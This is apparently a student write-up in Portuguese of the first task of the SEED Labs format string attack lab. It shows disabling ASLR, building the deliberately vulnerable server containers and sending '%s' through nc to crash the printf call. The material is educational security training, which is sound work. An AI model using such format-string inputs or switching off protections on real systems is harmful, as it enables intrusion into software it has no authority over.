# SEED Labs - Format String Attack Lab

## Task 1

Primeiro, fazemos o setup do ambiente.

```
[11/07/22]seed@VM:~/.../Labsetup$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[11/07/22]seed@VM:~/.../Labsetup$ cd server-code/
[11/07/22]seed@VM:~/.../server-code$ make
gcc -o server server.c
gcc -DBUF_SIZE=100 -z execstack  -static -m32 -o format-32 format.c
format.c: In function ‘myprintf’:
format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]
   44 |     printf(msg);
      |     ^~~~~~
gcc -DBUF_SIZE=100 -z execstack  -o format-64 format.c
format.c: In function ‘myprintf’:
format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]
   44 |     printf(msg);
      |     ^~~~~~
[11/07/22]seed@VM:~/.../server-code$ make install
cp server ../fmt-containers
cp format-* ../fmt-containers
[11/07/22]seed@VM:~/.../server-code$ docker-compose build
Building fmt-server-1
Step 1/6 : FROM handsonsecurity/seed-ubuntu:small
 ---> 1102071f4a1d
Step 2/6 : COPY server    /fmt/
 ---> Using cache
 ---> 80c72cf9a22f
Step 3/6 : ARG ARCH
 ---> Using cache
 ---> f9239525378c
Step 4/6 : COPY format-${ARCH}  /fmt/format
 ---> Using cache
 ---> c4d0d16c1058
Step 5/6 : WORKDIR /fmt
 ---> Using cache
 ---> 88c7018ea532
Step 6/6 : CMD ./server
 ---> Using cache
 ---> 51e6ef51b72d

Successfully built 51e6ef51b72d
Successfully tagged seed-image-fmt-server-1:latest
Building fmt-server-2
Step 1/6 : FROM handsonsecurity/seed-ubuntu:small
 ---> 1102071f4a1d
Step 2/6 : COPY server    /fmt/
 ---> Using cache
 ---> 80c72cf9a22f
Step 3/6 : ARG ARCH
 ---> Using cache
 ---> f9239525378c
Step 4/6 : COPY format-${ARCH}  /fmt/format
 ---> Using cache
 ---> 5bca17c905f0
Step 5/6 : WORKDIR /fmt
 ---> Using cache
 ---> 18e7c4bac7bb
Step 6/6 : CMD ./server
 ---> Using cache
 ---> cba6ae2644c3

Successfully built cba6ae2644c3
Successfully tagged seed-image-fmt-server-2:latest
[11/07/22]seed@VM:~/.../server-code$ docker-compose up
Starting server-10.9.0.5 ... done
Starting server-10.9.0.6 ... done
Attaching to server-10.9.0.5, server-10.9.0.6
```  

Vamos escrever no standard input a string "%s". A função `myprintf` vai chamar o equivalente a:
```c
 printf("%s");
 ```
Fazer esta chamada, sem passar os argumentos necessários à função `printf`, faz com que o programa trate um endereço na stack como um endereço onde uma string deveria estar guardada. O mais provável é que não seja possível ler uma string.
```
[11/07/22]seed@VM:~/.../Labsetup$ echo %s | nc 10.9.0.5 9090
```

```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd0f0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 3 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd018
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

# CTF
